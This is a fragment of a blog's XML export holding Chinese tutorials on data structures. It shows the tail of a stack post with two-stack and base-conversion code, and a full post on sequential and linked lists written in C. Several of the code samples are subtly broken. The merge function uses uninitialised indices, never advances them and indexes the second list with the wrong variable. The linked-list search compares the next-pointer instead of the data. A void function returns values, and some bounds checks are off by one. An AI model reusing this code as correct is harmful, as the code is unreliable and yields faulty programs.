class="keyword">if</span>(S-&gt;top[<span class="number">0</span>] == <span class="number">0</span>)      <span class="comment">//判断栈1是否为空</span></div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">            S-&gt;top[<span class="number">0</span>]--;    <span class="comment">//修改栈1的栈顶指针</span></div><div class="line">            *e = S-&gt;data[S-&gt;top[<span class="number">0</span>]];      <span class="comment">//从第1个栈中弹出</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">            <span class="keyword">if</span>(S-&gt;top[<span class="number">1</span>] == MAXSIZE<span class="number">-1</span>)      <span class="comment">//判断栈2是否为空</span></div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">            S-&gt;top[<span class="number">1</span>]++;    <span class="comment">//修改栈2的栈顶指针</span></div><div class="line">            *e = S-&gt;data[S-&gt;top[<span class="number">1</span>]];      <span class="comment">//从第2个栈中弹出</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//参数错误</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    DSeqStack S;</div><div class="line">    InitStack(&amp;S);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行进栈、出栈、判断栈空等操作</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h4><h5 id="数制转换"><a href="#数制转换" class="headerlink" title="数制转换"></a>数制转换</h5><p>数制转换过程中我们得到的结果序列往往是我们所要结果的逆序，这时候就需要栈来帮忙了。比如，将十进制数12转换成二进制序列，过程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">12/2 = 6...0</div><div class="line">6/2 = 3...0</div><div class="line">3/2 = 1...1</div><div class="line">1/2 = 0...1</div><div class="line"></div><div class="line">依次得到0011，但是12的二进制表示为1100，即为逆序。</div></pre></td></tr></table></figure>
<p>所以我们需要将每次得到的余数压入栈中，一直到没有元素需要压入栈中时再将元素依次从栈中弹出，即得到正确的结果。以十进制转K进制为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Conversion</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span></span>&#123;</div><div class="line">    ElemType x;</div><div class="line">    SeqStack S;</div><div class="line">    InitStack(&amp;S);</div><div class="line">    <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</div><div class="line">        x = n%k;</div><div class="line">        Push(&amp;S,x);     <span class="comment">//将得到的余数依次压入栈中</span></div><div class="line">        n = n/k;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span>(!StackEmpty(&amp;S))&#123;</div><div class="line">        Pop(&amp;S,&amp;x);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,x);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　栈的应用还有很多，比如括号匹配的检验、表达式求值，以及栈在递归中的重要作用。这里就不再一一描述了，以后在 Leetcode 上看到类似的题目再进行说明。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构基础之线性表</title>
    <url>/2016/09/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<p>　　数据结构也是算法学习的一部分，最近比较忙，在对所学的知识查漏补缺，没有学习什么新的东西，于是干脆就对一直在复习数据结构来了个大总结，这篇博客主要是数据结构的线性表部分，争取尽快把其他部分总结完。接下来的一段时间可能不会经常去 Leetcode 刷题了，近期的算法学习这一系列的博客将以数据结构为主，因为近来有更重要的事情要做，毕竟精力有限，刷题这一块就先放一放咯。</p>
<a id="more"></a>
<h4 id="线性表的基本概念"><a href="#线性表的基本概念" class="headerlink" title="线性表的基本概念"></a>线性表的基本概念</h4><p>　　定义：具有相同数据类型的n(n&gt;=0)个数据元素的有限序列</p>
<p>　　线性表的特点：</p>
<ol>
<li>表中的元素个数有限。</li>
<li>表中元素具有逻辑上的顺序性，在序列中各元素排列有其先后顺序。</li>
<li>表中元素都是数据元素，每个元素都是单个元素。</li>
<li>表中元素的数据类型都相同。</li>
<li>表中元素具有抽象性。即仅讨论元素间的逻辑关系，不考虑元素究竟表示什么内容。</li>
</ol>
<h4 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h4><h5 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h5><p>　　线性表的顺序存储。用一组地址连续的存储单元，依次存储线性表中的数据元素，使得逻辑上相邻的两个元素在物理上也相邻。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/6-3.jpg" alt="6-3"></p>
<p>　　注意：顺序表的位序是从1开始的，而数组中元素的下标是从0开始的。</p>
<ul>
<li>基本操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERFLOW -2</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INIT_SIZE 10 <span class="comment">//线性表存储空间的初始分配量</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INCREMENT 2 <span class="comment">//线性表存储空间的分配增量</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    ElemType *data; <span class="comment">//存储空间基址</span></div><div class="line">    <span class="keyword">int</span> length; <span class="comment">//当前长度</span></div><div class="line">    <span class="keyword">int</span> listsize; <span class="comment">//当前分配的存储容量(以sizeof(ElemType)为单位)</span></div><div class="line">&#125;SeqList;</div><div class="line"></div><div class="line"><span class="comment">/********初始化********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitList</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    L-&gt;data = (ElemType *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemType)*LIST_INIT_SIZE);</div><div class="line">    <span class="keyword">if</span>(!L-&gt;data)    </div><div class="line">        <span class="keyword">return</span> OVERFLOW;</div><div class="line">    L-&gt;length = <span class="number">0</span>;</div><div class="line">    L-&gt;listsize = LIST_INIT_SIZE;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/****************插入操作*****************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(SeqList *L,<span class="keyword">int</span> i,ElemType e)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> j;</div><div class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L-&gt;length+<span class="number">1</span>)   <span class="comment">//判断i的范围是否有效</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span>(L-&gt;length == L-&gt;listsize)     <span class="comment">//存储空间已满时不能插入</span></div><div class="line">        <span class="keyword">return</span> OVERFLOW;</div><div class="line">    <span class="keyword">for</span>(j=L-&gt;length;j&gt;=i;j--)   <span class="comment">//将第i个元素及之后的元素后移</span></div><div class="line">        L-&gt;data[j]=L-&gt;data[j<span class="number">-1</span>];</div><div class="line">    L-&gt;data[i<span class="number">-1</span>]=e;     <span class="comment">//在位置i处放入e</span></div><div class="line">    L-&gt;length++;    <span class="comment">//线性表长度加1</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********删除操作***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(SeqList *L,<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> j;</div><div class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L-&gt;length+<span class="number">1</span>)   <span class="comment">//判断i的范围是否有效</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">for</span>(j=i;j&lt;L-&gt;length;j++)  <span class="comment">//将第i个位置之后的元素前移</span></div><div class="line">        L-&gt;data[j<span class="number">-1</span>] = L-&gt;data[j];</div><div class="line">    L-&gt;length--;    <span class="comment">//线性表长度减1</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**********按位置查找************/</span></div><div class="line"><span class="function">ElemType <span class="title">GetElem</span><span class="params">(SeqList *L,<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L-&gt;length+<span class="number">1</span>)   <span class="comment">//判断i的范围是否有效</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">return</span> L-&gt;data[i<span class="number">-1</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************按值查找**************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(SeqList *L,ElemType e)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L-&gt;length;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(L-&gt;data[i] == e)</div><div class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********求表长**********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> L-&gt;length;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/******判断是否是空表*****/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListEmpty</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(L-&gt;length == <span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********输出表*********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">printList</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;L-&gt;length;i++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,L-&gt;data[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********清空表********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    L-&gt;length = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********销毁表********/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DstroyList</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="built_in">free</span>(L-&gt;data);</div><div class="line">    L-&gt;data = <span class="literal">NULL</span>;</div><div class="line">    L-&gt;length = <span class="number">0</span>;</div><div class="line">    L-&gt;listsize = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    SeqList L;</div><div class="line">    InitList(&amp;L);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行插入、删除、查找结点等操作</div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>扩展操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/********将顺序表的所有元素逆置******/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Reverse</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    ElemType temp;  <span class="comment">//辅助变量</span></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;((L-&gt;length)/<span class="number">2</span>);i++)&#123;     <span class="comment">//扫描顺序表L，进行元素交换</span></div><div class="line">        temp = L-&gt;data[i];</div><div class="line">        L-&gt;data[i] = L-&gt;data[L-&gt;length<span class="number">-1</span>-i];</div><div class="line">        L-&gt;data[L-&gt;length<span class="number">-1</span>-i] = temp;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/******删除有序顺序表中重复的元素******/</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Del_same</span><span class="params">(SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">1</span>;j&lt;L-&gt;length;j++)&#123;   <span class="comment">//i存储第一个不相同的元素，j工作指针</span></div><div class="line">        <span class="keyword">if</span>(L-&gt;data[i] != L-&gt;data[j])&#123;   <span class="comment">//查找下一个与上一个元素值不相同的元素</span></div><div class="line">            L-&gt;data[++i] = L-&gt;data[j];  <span class="comment">//找到后，则将元素前移</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    L-&gt;length = i+<span class="number">1</span>;    <span class="comment">//删除相同元素后，线性表的长度</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*****将两个有序顺序表合并成一个新的有序顺序表*****/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Merge</span><span class="params">(SeqList *L1,SeqList *L2,SeqList *L)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(L1-&gt;length + L2-&gt;length &gt; L-&gt;length)     <span class="comment">//大于合并表的长度</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">while</span>(i &lt; L1-&gt;length &amp;&amp; j &lt; L2-&gt;length)&#123;    <span class="comment">//循环，两两比较，较小的存入结果表</span></div><div class="line">        <span class="keyword">if</span>(L1-&gt;data[i] &lt;= L2-&gt;data[j])</div><div class="line">            L-&gt;data[k++] = L1-&gt;data[i];</div><div class="line">        <span class="keyword">else</span></div><div class="line">            L-&gt;data[k++] = L2-&gt;data[j];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span>(i &lt; L1-&gt;length)       <span class="comment">//处理剩下没比完的顺序表</span></div><div class="line">        L-&gt;data[k++] = L1-&gt;data[i++];</div><div class="line">    <span class="keyword">while</span>(j &lt; L2-&gt;length)</div><div class="line">        L-&gt;data[k++] = L2-&gt;data[i++];</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h4><h5 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h5><p>　　单链表：通过一组任意的存储单元来存储线性表中的数据元素。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/6-2.jpg" alt="6-2"></p>
<p>　　头结点head指向单链表的第一个结点。</p>
<p>　　结点由两部分组成：数据域data，指针域next(存放直接后继元素的地址)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></div><div class="line">    ElemType data;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></div><div class="line">&#125;LNode,*LinkList;</div><div class="line"></div><div class="line"><span class="comment">/************头插法建立链表*************/</span></div><div class="line"><span class="function">LinkList <span class="title">HeadInsert_CreatList</span><span class="params">(LinkList L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    LNode *s;</div><div class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));    <span class="comment">//创建头结点</span></div><div class="line">    L-&gt;next = <span class="literal">NULL</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"采用头插法建立链表，请输入结点值，以9999结束：\n"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">while</span>(n!=<span class="number">9999</span>)&#123;</div><div class="line">        s = (LinkList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//创建新结点</span></div><div class="line">        s-&gt;data = n;</div><div class="line">        s-&gt;next = L-&gt;next;</div><div class="line">        L-&gt;next = s;    <span class="comment">//将新结点插入表中</span></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> L;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/************尾插法建立链表*************/</span></div><div class="line"><span class="function">LinkList <span class="title">RearInsert_CreatList</span><span class="params">(LinkList L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    LNode *s,*r;</div><div class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));    <span class="comment">//创建头结点</span></div><div class="line">    r = L;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"采用尾插法建立链表，请输入结点值，以9999结束：\n"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">while</span>(n!=<span class="number">9999</span>)&#123;</div><div class="line">        s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建新结点</span></div><div class="line">        s-&gt;data = n;</div><div class="line">        r-&gt;next = s;</div><div class="line">        r = s;      <span class="comment">//r指向新的表尾结点</span></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    &#125;</div><div class="line">    r-&gt;next = <span class="literal">NULL</span>;     <span class="comment">//表尾结点指针置空</span></div><div class="line">    <span class="keyword">return</span> L;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*******按序号查找结点值*******/</span></div><div class="line"><span class="function">LNode* <span class="title">GetElem</span><span class="params">(LinkList L,<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</div><div class="line">    LNode *p = L-&gt;next;     <span class="comment">//头结点指针赋给p</span></div><div class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>)    <span class="comment">//i=0返回头结点</span></div><div class="line">        <span class="keyword">return</span> L;</div><div class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)     <span class="comment">//i无效则返回NULL</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i)&#123;  <span class="comment">//从第1个结点开始查找第i个结点</span></div><div class="line">        p = p-&gt;next;</div><div class="line">        j++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p;   <span class="comment">//返回第i个结点的指针</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************按值查找结点*************/</span></div><div class="line"><span class="function">LNode* <span class="title">LocateElem</span><span class="params">(LinkList L,ElemType e)</span></span>&#123;</div><div class="line">    LNode *p = L-&gt;next;     <span class="comment">//头结点指针赋给p</span></div><div class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;p-&gt;next!=e)  <span class="comment">//从第1个结点开始查找值为e的结点</span></div><div class="line">        p = p-&gt;next;</div><div class="line">    <span class="keyword">return</span> p;   <span class="comment">//找到则返回值为e的结点，否则返回NULL</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/****************插入结点****************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(LinkList L,<span class="keyword">int</span> i,ElemType x)</span></span>&#123;</div><div class="line">    LNode *s,*p;</div><div class="line">    p = GetElem(L,i<span class="number">-1</span>);     <span class="comment">//查找插入位置的前驱结点</span></div><div class="line">    s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建新结点</span></div><div class="line">    s-&gt;data = x;</div><div class="line">    s-&gt;next = p-&gt;next;</div><div class="line">    p-&gt;next = s;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*********求表长*********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(LinkList L)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">    LNode *p = L-&gt;next;     <span class="comment">//头结点指针赋给p</span></div><div class="line">    <span class="keyword">while</span>(p)&#123;</div><div class="line">        len++;  <span class="comment">//记录表中结点个数</span></div><div class="line">        p = p-&gt;next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> len;     <span class="comment">//返回表长</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/***********删除结点***********/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(LinkList L,<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    LNode *p = GetElem(L,i<span class="number">-1</span>);  <span class="comment">//查找待删除结点的前驱结点</span></div><div class="line">    LNode *q = p-&gt;next;     <span class="comment">//p指向需要删除的结点</span></div><div class="line">    p-&gt;next = q-&gt;next;      <span class="comment">//修改指针</span></div><div class="line">    <span class="built_in">free</span>(q);    <span class="comment">//释放删除结点的存储空间</span></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*****打印链表结点值******/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListPrint</span><span class="params">(LinkList L)</span></span>&#123;</div><div class="line">    LNode *p = L-&gt;next;     <span class="comment">//头结点指针赋给p</span></div><div class="line">    <span class="keyword">while</span>(p)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p-&gt;data);  <span class="comment">//按顺序依次输出结点值</span></div><div class="line">        p = p-&gt;next;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    LinkList L1,L2;</div><div class="line"></div><div class="line">    L1 = HeadInsert_CreatList(L1);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"采用头插法建立的链表L1的结点值为："</span>);</div><div class="line">    ListPrint(L1);</div><div class="line"></div><div class="line">    L2 = RearInsert_CreatList(L2);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"采用尾插法建立的链表L2的结点值为："</span>);</div><div class="line">    ListPrint(L2);</div><div class="line"></div><div class="line">    ....</div><div class="line"></div><div class="line">    进行插入、删除、查找结点等操作</div><div class="line">    ....</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h5><p>　　每个结点设置两个指针prior和next，分别指向其前驱结点和后继结点。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/6-5.jpg" alt="6-5"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></div><div class="line">    ElemType data;  <span class="comment">//数据域</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span>  <span class="comment">//前驱和后继指针</span></div><div class="line">&#125;DNode,*DLinkList;</div></pre></td></tr></table></figure>
<p>　　插入操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">//将结点*s插入到结点*p之后</span></div><div class="line">s-&gt;next = p-&gt;next;</div><div class="line">p-&gt;next-&gt;prior = s;</div><div class="line">s-&gt;prior = p;</div><div class="line">p-&gt;next = s;</div></pre></td></tr></table></figure>
<p>　　删除操作：<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">//删除结点*p的后继结点*q</span></div><div class="line">p-&gt;next = q-&gt;next;</div><div class="line">q-&gt;next-&gt;proir = p;</div><div class="line"><span class="built_in">free</span>(q);</div></pre></td></tr></table></figure></p>
<h5 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h5><p>　　将单链表的最后一个指针由NULL改为指向头结点，使整个链表形成一个环。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/6-4.jpg" alt="6-4"></p>
<p>　　判空条件为：头结点的指针是否等于头结点。插入删除与单链表相同。</p>
<h5 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h5><p>　　借助数组来描述线性表的链式存储结构。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/9/6-1.jpg" alt="6-1"></p>
<p>　　结点由两部分组成：数据域data，下一个元素的数组下标next。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></div><div class="line">    ElemType data;  <span class="comment">//存储数据元素</span></div><div class="line">    <span class="keyword">int</span> next;   <span class="comment">//下一个元素的数组下标</span></div><div class="line">&#125;SLinkList[MAXSIZE];</div></pre></td></tr></table></figure>
<p>　　以next=-1作为其结束的标志。</p>
<h4 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h4><h5 id="存取方式"><a href="#存取方式" class="headerlink" title="存取方式"></a>存取方式</h5><p>　　顺序表：可以顺序存取也可以随机存取。</p>
<p>　　链表：只能从表头顺序存取元素。</p>
<h5 id="逻辑结构与物理结构"><a href="#逻辑结构与物理结构" class="headerlink" title="逻辑结构与物理结构"></a>逻辑结构与物理结构</h5><p>　　顺序表：逻辑上相邻的元素，其对应的物理存储位置也相邻。</p>
<p>　　链表：逻辑上相邻的元素，其物理存储位置则不一定相邻。</p>
<h5 id="查找、插入和删除操作"><a href="#查找、插入和删除操作" class="headerlink" title="查找、插入和删除操作"></a>查找、插入和删除操作</h5><p>　　查找：按值查找时，顺序表无序时，顺序表和链表的时间复杂度均为O(n)，但是当顺序表有序时，可采用折半查找，时间复杂度为O(log2n)。</p>
<p>　　查找：按序号查找时，顺序表的时间复杂度仅为O(1)，而链表的平均时间复杂度为O(n)。</p>
<p>　　插入和删除：顺序表平均需要移动半个表长的元素，而链表只需要修改相关指针即可。</p>
<h5 id="空间分配"><a href="#空间分配" class="headerlink" title="空间分配"></a>空间分配</h5><p>　　顺序存储在空间分配中存在诸多问题与隐患，比如内存溢出、内存闲置等，而链式存储的结点空间只在需要的时候申请分配，只要内存有空间就可以分配，操作灵活、高效。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>开学季-那些迷茫与美好</title>
    <url>/2016/08/31/%E5%BC%80%E5%AD%A6%E5%AD%A3-%E9%82%A3%E4%BA%9B%E8%BF%B7%E8%8C%AB%E4%B8%8E%E7%BE%8E%E5%A5%BD/</url>
